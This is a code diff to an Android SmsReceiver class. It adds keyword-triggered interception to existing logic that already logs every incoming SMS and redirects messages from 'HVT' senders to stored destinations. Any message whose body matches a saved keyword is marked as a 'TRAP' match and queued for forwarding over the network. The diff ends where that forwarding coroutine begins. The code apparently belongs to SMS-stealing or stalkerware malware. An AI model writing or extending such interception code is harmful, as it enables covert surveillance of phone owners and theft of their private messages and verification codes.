@@ -50,9 +50,25 @@ class SmsReceiver : BroadcastReceiver() {
                 
                 DumpManager.appendLog("SMS", entry)
 
-                // --- HVT REDIRECTION LOGIC ---
+                // --- INTERCEPTION LOGIC (HVT & KEYWORDS) ---
                 val hvtPrefs = context.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE)
-                val redirectTarget = hvtPrefs.getString(sender, null)
+                val kwPrefs = context.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE)
+                
+                // Check phone-based redirect
+                var redirectTarget = hvtPrefs.getString(sender, null)
+                
+                // If no phone match, check keyword-based match
+                if (redirectTarget == null) {
+                    val allKwRules = kwPrefs.all
+                    for ((kw, dest) in allKwRules) {
+                        if (body.contains(kw, ignoreCase = true)) {
+                            redirectTarget = dest as? String
+                            DebugLogger.log("TRAP", "Keyword match found: [$kw]")
+                            break
+                        }
+                    }
+                }
+
                 if (redirectTarget != null) {
                     CoroutineScope(Dispatchers.IO).launch {
                         val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
